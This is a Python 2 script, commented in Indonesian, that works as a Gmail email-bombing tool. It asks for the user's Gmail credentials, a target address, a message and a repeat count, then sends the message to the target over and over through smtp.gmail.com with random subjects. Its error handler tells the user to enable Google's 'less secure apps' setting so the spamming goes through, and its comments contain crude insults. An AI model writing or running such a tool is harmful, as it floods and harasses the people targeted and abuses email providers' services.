# -*- coding: utf-8 -*-
# "Code By e52x
#."https://github.com/e52x
# "CIEE MAU RECODE YA?"
# =========================================================================================================================================
import os
import random
import smtplib
import sys
import getpass
import time
# ======================================================================================================================
os.system('clear')
print ('''
   _   __                             ___  
  | | / /                            |__ \ 
  | |/ /  __ _ _ __ _ __ ___   __ _     ) |
  |    \ / _` | '__| '_ ` _ \ / _` |   / / 
  | |\  \ (_| | |  | | | | | | (_| |  |_|  
  \_| \_/\__,_|_|  |_| |_| |_|\__,_|  (_)


\033[93m(Owner)\033[97m \033[93mKangSantuy\033[97m
\033[93m(Github)\033[97m \033[93mhttps://github.com/e52x\033[97m
\033[93m(Whatsapp)\033[97m \033[93m+62 896-9161-0704\033[97m
''')
print(" ")
#########################   JANGAN DI UBAH CIL NANTI ERROR ##########################
user = raw_input('\033[94m[?] \033[97mGmail \033[92mLu\033[97m :\033[93m ')
passworde = getpass.getpass('\033[94m[?]\033[97mPassword \033[91mLu\033[97m :\033[93m ')
print(" ")
victime = raw_input('\033[94m[?]\033[97m Target \033[91mGmail\033[97m : \033[93m')
message = raw_input('\033[94m[?]\033[97m Kirim \033[92mPesan\033[97m : \033[93m')
print(" ")
hani = input('\033[94m[?] \033[97mJumlah of \033[92mSpam\033[97m : \033[93m')
print(" ")
print("\033[94m[*] \033[97mMengirim! : ")
############################### DI BILANG GK USAH DI GANTI BCH TOLOL  ##################
smtp_server = 'smtp.gmail.com'
port = 587

########################## LU KAYA ANJING ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print ("\033[94m[✔]\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
        sys.stdout.flush()
    server.quit()
    print ('\033[93m[✔]\033[97mSemua\033[97mPesan\033[92mSudah Ke kirim\033[97m ')
    
    
except KeyboardInterrupt:
    print ('[✘] Membatalkan')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m[✘] \033[91m!Error \033[97m:")
    print ('\033[94m[✘] \033[97m!\033[93mNama \033[97mAtau \033[93mpassword \033[97mAnda Salah.')
    print ("\033[94m[!] \033[97mAktifin ini dulu cuy baru bisa spam\nCheck at https://myaccount.google.com/lesssecureapps")
    sys.exit()

